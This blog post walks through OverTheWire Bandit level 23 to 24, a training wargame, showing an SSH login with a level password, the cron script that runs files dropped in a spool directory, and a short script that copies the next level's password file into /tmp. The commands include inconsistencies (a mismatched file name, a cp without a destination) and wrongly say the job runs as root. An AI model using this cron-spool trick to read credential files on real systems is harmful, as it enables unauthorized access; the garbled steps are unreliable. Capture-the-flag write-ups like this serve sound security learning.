---
layout: post
author: mike
series: bandit
categories: bandit 
---

### Level 23 -> 24
#### Game Instructions
> A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.

>NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

>NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

This one looks a bit similar to the previous 2 levels... Let's dig in!

```
ssh -p 2220 bandit23@bandit.labs.overthewire.org
password: jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
```

As the hint says: We need to investigate the `/etc/cron.d` file to see what is happening:
```sh
#!/bin/bash
myname=$(whoami)
cd /var/spool/$myname
echo "Executing and deleting all scripts in /var/spool/$myname:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        timeout -s 9 60 ./$i
        rm -f ./$i
    fi
done
```

We can see that the file is systematically (every 60 sceonds) running every script **as root** in the `/var/spool/$myname` directory and immediately deleting the file after executing.

Because the script is being run as root, we can exploit this if we can manage to get a script in the `/var/spool/bandit24` directory that spits on the password.
First, let's create a directory to do some work in:
`mkdir /tmp/myfancydirectory`
And a file that the password will be copied to:
`touch /tmp/myfancydirectory/thisisthepassword`
Next, let's whip up a simple script:
`nano istealyourpass.sh`
```
#!/bin/bash

cat /etc/bandit_pass24 > /tmp/myfancydirectory/thisisthepassword
```
This will copy the password to a file called `thisisthepassword`
Let's `chmod` it so the script can execute it
`chmod 777 /tmp/myfancydirectory/istealyourpass`
Now let's quickly copy the file to the `/var/spool/bandit24` directory so it can be picked up
`cp /tmp/myfancydirectory/istealyourpass`
And we wait for it to run.
After a little bit we check the directory and bam we have the password:
New password: `UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ`
